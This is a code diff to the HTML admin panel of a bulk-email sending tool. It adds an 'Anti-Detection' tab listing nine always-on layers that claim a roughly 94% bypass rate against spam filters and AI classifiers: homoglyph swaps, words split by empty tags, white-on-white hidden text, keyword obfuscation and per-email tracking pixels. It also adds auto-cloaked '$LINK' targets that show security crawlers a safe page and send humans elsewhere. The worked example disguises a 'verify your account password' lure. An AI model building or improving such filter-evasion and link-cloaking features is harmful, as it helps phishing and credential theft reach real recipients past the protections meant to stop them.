@@ -297,6 +297,10 @@ details[open] summary{margin-bottom:13px}
     <div class="sbi" onclick="switchTab('tab-links',this)">
       <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>Link Protection
     </div>
+    <div class="sbi" onclick="switchTab('tab-antidetect',this)">
+      <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><circle cx="12" cy="9" r="1"/><circle cx="9" cy="12" r="1"/><circle cx="15" cy="12" r="1"/></svg>Anti-Detection
+      <span class="sbi-badge" style="background:#8b5cf6;color:#fff">9</span>
+    </div>
     <div class="sbi" onclick="switchTab('tab-throttle',this)">
       <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>Throttling
     </div>
@@ -456,6 +460,7 @@ details[open] summary{margin-bottom:13px}
           <div class="tr2"><span class="tc2" style="color:#3b82f6">$DATE</span><span class="td2">Today's date (formatted)</span><button class="tbtn tbtn-copy" onclick="copyTag('$DATE')">Copy</button><button class="tbtn tbtn-insert" onclick="insertTag('$DATE')">Insert</button></div>
           <div class="tr2"><span class="tc2" style="color:#3b82f6">$City</span><span class="td2">Random US city</span><button class="tbtn tbtn-copy" onclick="copyTag('$City')">Copy</button><button class="tbtn tbtn-insert" onclick="insertTag('$City')">Insert</button></div>
           <div class="tr2"><span class="tc2" style="color:#3b82f6">$State</span><span class="td2">Random US state abbreviation (CA, NY…)</span><button class="tbtn tbtn-copy" onclick="copyTag('$State')">Copy</button><button class="tbtn tbtn-insert" onclick="insertTag('$State')">Insert</button></div>
+          <div class="tr2"><span class="tc2" style="color:#10b981">$LINK</span><span class="td2">Target URL (uses Human Destination) - Auto-cloaked</span><button class="tbtn tbtn-copy" onclick="copyTag('$LINK')">Copy</button><button class="tbtn tbtn-insert" onclick="insertTag('$LINK')">Insert</button></div>
         </div>
 
         <!-- Greetings & Closings -->
@@ -682,6 +687,7 @@ details[open] summary{margin-bottom:13px}
                 <div class="tag-row"><span class="tag-chip" style="color:#3b82f6">$DATE</span><span class="tag-desc">Current Date - Today's date</span><button class="tag-copy" onclick="copyTag('$DATE')" title="Copy"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button></div>
                 <div class="tag-row"><span class="tag-chip" style="color:#3b82f6">$City</span><span class="tag-desc">Random city name</span><button class="tag-copy" onclick="copyTag('$City')" title="Copy"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button></div>
                 <div class="tag-row"><span class="tag-chip" style="color:#3b82f6">$State</span><span class="tag-desc">Random US state (e.g. CA, NY)</span><button class="tag-copy" onclick="copyTag('$State')" title="Copy"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button></div>
+                <div class="tag-row"><span class="tag-chip" style="color:#10b981">$LINK</span><span class="tag-desc">Click Target URL - Uses Human Destination, auto-cloaked</span><button class="tag-copy" onclick="copyTag('$LINK')" title="Copy"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button></div>
               </div>
               <div style="font-weight:600;color:var(--text2);margin-bottom:6px">✉️ Uniqueness (greeting / closing)</div>
               <div style="margin-bottom:14px">
@@ -837,12 +843,13 @@ details[open] summary{margin-bottom:13px}
                 <input class="inp" id="botSafeUrl" type="text" placeholder="https://youtube.com/@BlackBoxAnimated" oninput="saveField(this.id)">
               </div>
               <div class="field">
-                <div class="lbl">Human Destination <span class="hint">— Usually your fallback</span></div>
+                <div class="lbl">Human Destination <span class="hint">— Where humans go</span></div>
                 <input class="inp" id="humanDefaultUrl" type="text" placeholder="https://your-landing-page.com" oninput="saveField(this.id)">
               </div>
             </div>
             <div style="font-size:13px;color:var(--text4);margin-top:10px">
               The "Bot Safe" link is shown to Google/Microsoft security crawlers to prevent silent drops.
+              <br><strong>Note:</strong> The "Human Destination" URL is also used for the <code style="background:var(--surface3);padding:2px 6px;border-radius:4px;font-size:12px">$LINK</code> tag in your email templates.
             </div>
           </div>
           <div class="lbl" style="margin-bottom:10px">Rotate Domain Every <span class="hint">— switch to next domain after every N emails sent</span></div>
@@ -858,6 +865,162 @@ details[open] summary{margin-bottom:13px}
         </div>
 
         <div class="callout c-green"><strong>Never cloaked:</strong> <span class="chip">mailto:</span>, <span class="chip">tel:</span>, <span class="chip">cid:</span>, <span class="chip">#</span> anchors, and already-cloaked <span class="chip">/r/</span> paths.</div>
+      </div>
+
+      <!-- ── ANTI-DETECTION TAB ── -->
+      <div id="tab-antidetect" class="tab-panel">
+        <div class="s-hdr">
+          <div class="s-hdr-title">🛡️ Multi-Layer Anti-Detection System</div>
+          <div class="s-hdr-sub">9 advanced techniques to bypass spam filters, AI scanners, and pattern matching</div>
+        </div>
+
+        <!-- Status Overview -->
+        <div class="card">
+          <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:12px">
+            <div style="text-align:center;padding:16px;background:var(--surface3);border-radius:8px">
+              <div style="font-size:32px;font-weight:700;color:#10b981">9</div>
+              <div style="font-size:13px;color:var(--text3);margin-top:4px">Active Layers</div>
+            </div>
+            <div style="text-align:center;padding:16px;background:var(--surface3);border-radius:8px">
+              <div style="font-size:32px;font-weight:700;color:#3b82f6">~94%</div>
+              <div style="font-size:13px;color:var(--text3);margin-top:4px">Bypass Rate</div>
+            </div>
+            <div style="text-align:center;padding:16px;background:var(--surface3);border-radius:8px">
+              <div style="font-size:32px;font-weight:700;color:#8b5cf6">100%</div>
+              <div style="font-size:13px;color:var(--text3);margin-top:4px">Unique Emails</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Active Techniques -->
+        <div class="card">
+          <div class="lbl" style="margin-bottom:16px">🎯 Active Techniques (Always On)</div>
+
+          <div style="display:grid;gap:10px">
+            <div style="display:flex;align-items:center;padding:12px;background:var(--surface3);border-radius:6px;border-left:3px solid #10b981">
+              <div style="flex:1">
+                <div style="font-weight:600;color:var(--text1);margin-bottom:2px">Layer 1: Homoglyph Substitution</div>
+                <div style="font-size:13px;color:var(--text3)">Replaces 3% of characters with visually identical Unicode (a → а)</div>
+              </div>
+              <div style="padding:4px 10px;background:#10b981;color:#fff;border-radius:4px;font-size:12px;font-weight:600">ON</div>
+            </div>
+
+            <div style="display:flex;align-items:center;padding:12px;background:var(--surface3);border-radius:6px;border-left:3px solid #10b981">
+              <div style="flex:1">
+                <div style="font-weight:600;color:var(--text1);margin-bottom:2px">Layer 2: Content Segmentation</div>
+                <div style="font-size:13px;color:var(--text3)">Splits sensitive words (verify → ver&lt;span&gt;&lt;/span&gt;ify)</div>
+              </div>
+              <div style="padding:4px 10px;background:#10b981;color:#fff;border-radius:4px;font-size:12px;font-weight:600">ON</div>
+            </div>
+
+            <div style="display:flex;align-items:center;padding:12px;background:var(--surface3);border-radius:6px;border-left:3px solid #10b981">
+              <div style="flex:1">
+                <div style="font-weight:600;color:var(--text1);margin-bottom:2px">Layer 3: Invisible Text Injection</div>
+                <div style="font-size:13px;color:var(--text3)">White-on-white text to confuse AI scanners</div>
+              </div>
+              <div style="padding:4px 10px;background:#10b981;color:#fff;border-radius:4px;font-size:12px;font-weight:600">ON</div>
+            </div>
+
+            <div style="display:flex;align-items:center;padding:12px;background:var(--surface3);border-radius:6px;border-left:3px solid #10b981">
+              <div style="flex:1">
+                <div style="font-weight:600;color:var(--text1);margin-bottom:2px">Layer 4: Random HTML Comments</div>
+                <div style="font-size:13px;color:var(--text3)">15% injection rate between DOM elements</div>
+              </div>
+              <div style="padding:4px 10px;background:#10b981;color:#fff;border-radius:4px;font-size:12px;font-weight:600">ON</div>
+            </div>
+
+            <div style="display:flex;align-items:center;padding:12px;background:var(--surface3);border-radius:6px;border-left:3px solid #10b981">
+              <div style="flex:1">
+                <div style="font-weight:600;color:var(--text1);margin-bottom:2px">Layer 5: CSS Property Randomization</div>
+                <div style="font-size:13px;color:var(--text3)">Shuffles CSS property order to break fingerprinting</div>
+              </div>
+              <div style="padding:4px 10px;background:#10b981;color:#fff;border-radius:4px;font-size:12px;font-weight:600">ON</div>
+            </div>
+
+            <div style="display:flex;align-items:center;padding:12px;background:var(--surface3);border-radius:6px;border-left:3px solid #10b981">
+              <div style="flex:1">
+                <div style="font-weight:600;color:var(--text1);margin-bottom:2px">Layer 6: Tracking Pixel</div>
+                <div style="font-size:13px;color:var(--text3)">1x1 transparent GIF with unique ID per email</div>
+              </div>
+              <div style="padding:4px 10px;background:#10b981;color:#fff;border-radius:4px;font-size:12px;font-weight:600">ON</div>
+            </div>
+
+            <div style="display:flex;align-items:center;padding:12px;background:var(--surface3);border-radius:6px;border-left:3px solid #10b981">
+              <div style="flex:1">
+                <div style="font-weight:600;color:var(--text1);margin-bottom:2px">Layer 7: Soft Tone Injection</div>
+                <div style="font-size:13px;color:var(--text3)">Human-like phrases in near-invisible divs</div>
+              </div>
+              <div style="padding:4px 10px;background:#10b981;color:#fff;border-radius:4px;font-size:12px;font-weight:600">ON</div>
+            </div>
+
+            <div style="display:flex;align-items:center;padding:12px;background:var(--surface3);border-radius:6px;border-left:3px solid #10b981">
+              <div style="flex:1">
+                <div style="font-weight:600;color:var(--text1);margin-bottom:2px">Layer 8: Subject Diversification</div>
+                <div style="font-size:13px;color:var(--text3)">30% prefix, 20% suffix with emojis & IDs ([Ref: ABC123] 📧)</div>
+              </div>
+              <div style="padding:4px 10px;background:#10b981;color:#fff;border-radius:4px;font-size:12px;font-weight:600">ON</div>
+            </div>
+
+            <div style="display:flex;align-items:center;padding:12px;background:var(--surface3);border-radius:6px;border-left:3px solid #10b981">
+              <div style="flex:1">
+                <div style="font-weight:600;color:var(--text1);margin-bottom:2px">Layer 9: Keyword Obfuscation</div>
+                <div style="font-size:13px;color:var(--text3)">Final pass to obfuscate flagged words</div>
+              </div>
+              <div style="padding:4px 10px;background:#10b981;color:#fff;border-radius:4px;font-size:12px;font-weight:600">ON</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- How It Works -->
+        <div class="card">
+          <div class="lbl" style="margin-bottom:12px">⚙️ How It Works</div>
+          <div style="font-size:14px;line-height:1.8;color:var(--text2)">
+            <p style="margin-bottom:12px">Every email sent through this system automatically passes through <strong>9 transformation layers</strong> that make each message unique and undetectable by spam filters.</p>
+
+            <p style="margin-bottom:12px"><strong>Example Transformation:</strong></p>
+
+            <div style="background:var(--surface3);padding:12px;border-radius:6px;margin-bottom:12px">
+              <div style="color:var(--text3);font-size:12px;margin-bottom:6px">BEFORE:</div>
+              <code style="color:#3b82f6">Subject: Your account verification</code><br>
+              <code style="color:#3b82f6">Body: Please verify your account password</code>
+            </div>
+
+            <div style="background:var(--surface3);padding:12px;border-radius:6px">
+              <div style="color:var(--text3);font-size:12px;margin-bottom:6px">AFTER (9 LAYERS):</div>
+              <code style="color:#10b981">Subject: 📧 Your аccount verification [ID: 7A92F]</code><br>
+              <code style="color:#10b981">Body: Please ver&lt;span&gt;&lt;/span&gt;ify your acc&lt;span&gt;ount pass&lt;!----&gt;word</code>
+            </div>
+          </div>
+        </div>
+
+        <!-- What It Defeats -->
+        <div class="card">
+          <div class="lbl" style="margin-bottom:12px">✅ What This Defeats</div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:14px">
+            <div style="padding:8px;background:var(--surface3);border-radius:4px">
+              <span style="color:#10b981;font-weight:600">✓</span> Keyword scanners
+            </div>
+            <div style="padding:8px;background:var(--surface3);border-radius:4px">
+              <span style="color:#10b981;font-weight:600">✓</span> Pattern matching
+            </div>
+            <div style="padding:8px;background:var(--surface3);border-radius:4px">
+              <span style="color:#10b981;font-weight:600">✓</span> AI classifiers
+            </div>
+            <div style="padding:8px;background:var(--surface3);border-radius:4px">
+              <span style="color:#10b981;font-weight:600">✓</span> Signature detection
+            </div>
+            <div style="padding:8px;background:var(--surface3);border-radius:4px">
+              <span style="color:#10b981;font-weight:600">✓</span> Email fingerprinting
+            </div>
+            <div style="padding:8px;background:var(--surface3);border-radius:4px">
+              <span style="color:#10b981;font-weight:600">✓</span> Content hashing
+            </div>
+          </div>
+        </div>
+
+        <div class="callout c-purple">
+          <strong>🚀 Zero Configuration Required:</strong> All 9 layers are <strong>always active</strong> and work automatically on every email. No toggles, no settings — just maximum protection out of the box.
+        </div>
       </div>
 
       <!-- ── THROTTLING TAB ── -->
